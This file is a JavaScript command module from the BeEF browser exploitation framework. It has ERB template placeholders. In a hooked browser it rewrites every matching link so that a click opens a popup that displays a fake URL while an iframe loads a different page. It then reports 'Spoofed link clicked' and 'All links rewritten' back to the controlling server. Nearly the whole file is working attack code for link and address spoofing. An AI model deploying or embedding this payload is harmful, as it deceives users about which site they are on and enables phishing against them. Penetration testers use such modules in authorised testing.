//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


var somethingsomething = function() {
	var fake_url = "<%= @fake_url %>";
	var real_url = "<%= @real_url %>";

	var newWindow = window.open(fake_url,'newWindow<%= @command_id %>','width=200,height=100,location=yes');
	newWindow.document.write('<iframe style="width:100%;height:100%;border:0;padding:0;margin:0;" src="' + real_url + '"></iframe>');
	newWindow.focus();
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Spoofed link clicked');	
}

beef.execute(function() {

	$j('<%= @domselectah %>').each(function() {
		$j(this).attr('href','#').click(function() {
			somethingsomething();
			return true;
		});
	});

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=All links rewritten');

});